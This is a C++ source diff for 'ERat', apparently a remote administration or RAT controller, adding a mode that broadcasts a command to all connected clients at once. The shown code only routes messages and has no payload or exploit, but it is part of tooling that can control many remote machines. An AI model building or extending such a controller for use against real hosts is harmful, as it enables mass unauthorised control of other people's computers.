@@ -55,7 +55,24 @@ namespace ERat
 			std::cout << "Missing command args" << std::endl;
 		}
 		else {
-			if (!_usedClient) {
+			if (_allClient == 1){
+//					std::cout << "ON ENVOI à tout le monde" << std::endl;
+
+					auto clients = _server.getClients();
+					auto it = clients.begin();
+					int i = 0;
+
+					while (it != clients.end()) {
+						ERat::Message	message(ERat::Message::Cmd);
+						message.setBody(commandLine.c_str(), commandLine.size());
+						std::cout << "Sending " << commandLine.c_str() << " #" << i << ": " << (*it)->getIp() << std::endl;
+						(*it)->addMessage(message);
+						++it;
+						++i;
+					}
+					return true;
+			}
+			else if (!_usedClient) {
 				std::cout << "You must first select a client (list)" << std::endl;
 				return false;
 			}
@@ -86,6 +103,7 @@ namespace ERat
 	{
 		auto	it = args.begin();
 
+		_allClient = 0;
 		_usedClient.reset();
 		++it;
 		if (it != args.end()) {
@@ -94,6 +112,10 @@ namespace ERat
 			if (i < _server.getClients().size()) {
 				_usedClient = _server.getClients()[i];
 				std::cout << "Use client: " << _usedClient->getIp() << std::endl;
+			}
+			else{
+				std::cout << "Use all client" << std::endl;
+				_allClient = 1;
 			}
 		}
 		else {
@@ -108,4 +130,3 @@ namespace ERat
 		_serverThread->join();
 	}
 }
-
